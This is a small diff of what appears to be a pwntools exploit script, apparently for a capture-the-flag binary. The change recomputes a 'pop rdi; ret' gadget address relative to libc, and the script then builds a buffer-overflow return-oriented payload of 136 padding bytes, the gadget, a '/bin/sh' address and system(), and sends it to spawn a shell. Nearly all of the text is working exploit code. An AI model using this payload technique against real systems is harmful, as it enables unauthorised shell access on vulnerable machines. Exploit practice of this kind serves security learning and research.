@@ -14,6 +14,11 @@ binsh = offset + system_addr
 log.info("/bin/sh = " + hex(binsh))
 
 pop_rdi_ret = 0x04008b3
+
+pop_rdi_ret_libc = 0x00022b9a
+pop_rdi_ret = pop_rdi_ret_libc - libc.symbols['system'] + system_addr
+log.info("pop_rdi_ret = " + hex(pop_rdi_ret))
+
 payload = "A" * 136 + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
  
 p.send(payload)
